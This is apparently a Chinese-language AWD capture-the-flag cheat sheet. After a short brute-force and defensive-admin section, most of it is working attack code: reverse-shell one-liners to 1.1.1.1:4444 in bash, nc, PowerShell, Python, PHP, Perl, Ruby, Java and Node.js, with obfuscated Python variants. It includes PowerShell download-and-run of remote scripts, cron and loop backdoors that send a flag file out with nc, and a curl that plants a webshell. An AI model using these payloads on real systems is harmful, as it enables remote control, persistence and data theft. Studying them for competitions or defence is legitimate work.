---
title: AWD CheatSheet
tags: 学习笔记
abbrlink: 7923
---



## 攻击

### crunch + hydra

```
crunch 10 10 -t 201800%%% -o password.txt
hydra -u root -p password.txt -l 192.168.9.0/24
```

### 防御

```bash
ps -u ctf  # 显示特定用户进程

last -n 5 awk '{print $1}' # 显示最近登录的5个账号

cat /etc/passwd |awk -F ':' '{print $1}' #显示所有账户

netstat -antulp | grep EST # 查看所有链接

lsof -i:3306 # 查看端口号

tar cvf www.tar /var/www/html # 打包源码

scp /tmp ctf@192.168.1.1:/var/www/html # 下载源码

mysqldump -u root -p ctf>ctf.sql # 备份数据库

mysql -u root -p ctf< ctf.sql #恢复数据库
或
source ctf.sql 

find . -name "*.php" -perm 4777 # 查找777权限的php文件

find ./ -mtime 0 -name "*.php" # 查找24小时内修改过的php文件

rm -rf `find /var/www/html -name .*.php` # 删除目录下 .*.php的文件
    
chattr -R +i /var/www/html # 锁定文件
    
tcpdump -s 0 -w ctf.pcap port 9999 # 高权限tcpdump抓包

alias curl="echo flag{1a5d51c54515649463521}" # 别名

unalias


```

### 杀进程

```
kill [pid]
killall [进程名]
pkill [进程名]
pkill -u [用户名]
```



## 权限维持

### 反弹 shell

#### 系统自带反弹

```bash
nc -e /bin/bash 1.1.1.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.1.1.1 4444 >/tmp/f
bash -c 'bash -i >/dev/tcp/1.1.1.1/4444 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 1.1.1.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.1.1.1:4444  
awk 'BEGIN{s="/inet/tcp/0/1.1.1.1/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

### 反弹 shell

#### powercat

```cmd
# 下载powercat
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
# 反弹shell
powercat -c 1.1.1.1 -p 4444 -e cmd
```

#### nishang

```cmd
# 下载Invoke-PowerShellTcp
IEX (**New**-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');
# 反弹shell
Invoke-PowerShellTcp -Reverse -IPAddress 1.1.1.1 -port 4444
```

#### powershell自定义函数

```cmd
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('1.1.1.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### python2

```cmd
#linux
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#windows
python -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1.1.1.1', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

#### python3

*(python3的只发现在msfvenom上有meterpreter版本的,没有普通的oneliner reverse shell,因此自己写了一个)*

```cmd
python -c "(lambda __g, __y: [[[[(sock.connect(('1.1.1.1',4444)), (lambda __after: __y(lambda __this: lambda: [[[[(sock.send(m_stdout), (time.sleep(1), __this())[1])[1] for (__g['m_stdout'], __g['m_stderr']) in [(comRst.communicate())]][0] for __g['comRst'] in [(subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE))]][0] for __g['data'] in [(data.decode('utf-8'))]][0] for __g['data'] in [(sock.recv(1024))]][0] if True else __after())())(lambda: None))[1] for __g['sock'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['time'] in [(__import__('time', __g, __g))]][0])(globals(), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))"
```



#### php

```shell
php -r '$sock=fsockopen("1.1.1.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### perl

```shell
perl -e 'use Socket;$i="1.1.1.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### ruby

```shell
# linux
ruby -rsocket -e'f=TCPSocket.open("1.1.1.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
# windows
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("1.1.1.1","4444");while(cmd=c.gets);IO.popen(cmd,"r")io|c.print io.readend'
```

#### java

保存到jar文件,运行

```java
public class Revs {
    /**
    * @param args
    * @throws Exception 
    */
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/1.1.1.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

#### nodejs

```javascript
(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "1.1.1.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

以上命令均测试过有效,使用请自行修改ip和port.

### 后门

#### crontab

`echo '*/1 * * * * nc -w 1 1.1.1.1 4444 < /flag' > initflag.cron` 

`crontab initflag.cron`

#### shell

`echo  'while true\ndo\nnc -w 1 1.1.1.1 4444 < /flag >&1\nsleep 1m\ndone'> web_init.sh`

`sh web_init.sh`

#### webshell

`curl http://1.1.1.1/LongLiveAlkaid.txt -o .function.inc.php`

webshell pass:
get:url?pass=LongLiveAlkaid
post:a



## 参考链接

<https://klionsec.github.io/2016/09/27/revese-shell/>

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md)